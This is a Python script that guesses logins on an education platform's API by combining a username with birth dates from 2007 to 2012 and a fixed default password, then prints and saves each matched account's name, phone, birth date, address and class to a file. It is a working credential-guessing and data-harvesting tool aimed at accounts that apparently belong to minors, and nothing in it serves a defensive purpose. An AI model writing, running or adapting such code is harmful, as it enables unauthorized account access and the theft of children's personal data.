import requests
import json
from colorama import Fore, Back, Style, init
import os
import time


def clear_terminal():
    if os.name == 'posix':
        os.system('clear')
    elif os.name == 'nt':
        os.system('cls')

clear_terminal()

def cari(username, urutan, tahun):
        with open(tahun, "r") as file:

            lines = file.readlines()
            date = lines[urutan].strip()
            url = "https://api.gesitbelajar.com/api/login"
            print("Trying : " + username + "_" + date)
            headers = {
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "16",
                "Host": "api.gesitbelajar.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.0",
            }
            data = {
                "username": f"{username}_{date}",
                "password": "123456789"
            }

            response = requests.post(url, headers=headers, data=data)

            if response.status_code == 200:
                hasil = json.loads(response.text)
                status = hasil["status"]
                if status == 200:
                    print(Fore.RED)
                    print("Trying : " + username + "_" + date)
                    print(Fore.LIGHTGREEN_EX)
                    un = hasil["data"]["username"]
                    nm = hasil["profile"]["name"]
                    ph = hasil["data"]["phone"]
                    lh = hasil["profile"]["date_of_birth"]
                    ad = hasil["profile"]["address"]
                    cl = hasil["profile"]["current_class"]
                    pt = hasil["profile"]["poin_total"]
                    print("===========================")
                    print("Successfully got the data")
                    print("===========================\n")
                    print("Username : " + un)
                    print("Password : 123456789")
                    print("Name : " + nm)
                    print("Phone : " + ph)
                    print("Date Of Birth : " + str(lh))
                    print("Address : " + str(ad))
                    print("Current Class : " + str(cl))
                    print("Poin Total : " + str(pt))
                    file_name = username + "_" + date + ".json"
                    with open(file_name, "w") as file:
                        # Menulis data ke dalam file
                        file.write(response.text)
                    print("\n\nData is stored in " + file_name)
                else:
                     print("   Wrong username\n")


u = input("Input Username: ")
r = input("Input Range Tahun (2007-2009 = 1 | 2010-2012 = 2) : ")
if r == "1":
    try:
        t = "1.txt"
        l = 0
        while l < 744:
            l += 1
            cari(u, l, t)
    except KeyboardInterrupt:
        print("CTRL + C clicked, Script stopped")
elif r == "2":
    try:
        t = "2.txt"
        l = 0
        while l < 744:
            l += 1
            cari(u, l, t)
    except KeyboardInterrupt:
        print("CTRL + C clicked, Script stopped")

